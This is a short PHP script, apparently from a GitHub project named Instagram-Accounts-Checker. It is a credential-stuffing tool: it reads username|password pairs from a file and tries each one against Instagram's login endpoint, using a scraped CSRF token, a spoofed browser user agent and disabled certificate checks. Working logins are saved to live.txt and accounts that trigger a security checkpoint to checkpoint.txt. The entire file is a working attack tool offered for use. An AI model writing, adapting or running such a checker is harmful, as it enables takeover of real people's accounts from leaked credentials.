<?php
/**
 * @author Rifqi Haidar
 * @license  MIT
 * @link https://github.com/rifqihaidar/Instagram-Accounts-Checker
 */

if(isset($argv[1])) {
    if(file_exists($argv[1])) {
        $ambil = explode(PHP_EOL, file_get_contents($argv[1]));
        foreach($ambil as $targets) {
            $potong = explode("|", $targets);
            cekAkunIg($potong[0], $potong[1]);
        }
    }else die("File doesn't exist!");
}else die("Usage: php check.php targets.txt");

function cekAkunIg($username, $password) {
    $get = file_get_contents("https://www.instagram.com/");
    preg_match("/csrf_token\":\"(.*?)\"/i", $get, $csrf);

    $header = array();
    $header[] = "Accept: */*";
    $header[] = "Accept-Encoding: gzip, deflate, br";
    $header[] = "Accept-Language: en-US,en;q=0.9";
    $header[] = "Content-Type: application/x-www-form-urlencoded";
    $header[] = "Cookie: csrftoken=".$csrf[1];
    $header[] = "Origin: https://www.instagram.com";
    $header[] = "Referer: https://www.instagram.com/accounts/login/";
    $header[] = "X-CSRFToken: ".$csrf[1];
    $header[] = "X-Instagram-AJAX: 1";
    $header[] = "X-Requested-With: XMLHttpRequest";

    $ch = curl_init("https://www.instagram.com/accounts/login/ajax/");
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux i686; rv:50.0) Gecko/20100101 Firefox/50.0");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "username=".$username."&password=".$password);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $exec = curl_exec($ch);
    $result = json_decode($exec);

    $userpass = $username."|".$password;
    if(isset($result->userId) && $result->status == "ok") {
        echo $userpass." --> LIVE".PHP_EOL;
        file_put_contents("live.txt", $userpass.PHP_EOL, FILE_APPEND);
    }elseif($result->message == "checkpoint_required") {
        echo $userpass." --> CHECKPOINT".PHP_EOL;
        file_put_contents("checkpoint.txt", $userpass.PHP_EOL, FILE_APPEND);
    }else echo $userpass." --> DIE".PHP_EOL;
}
?>
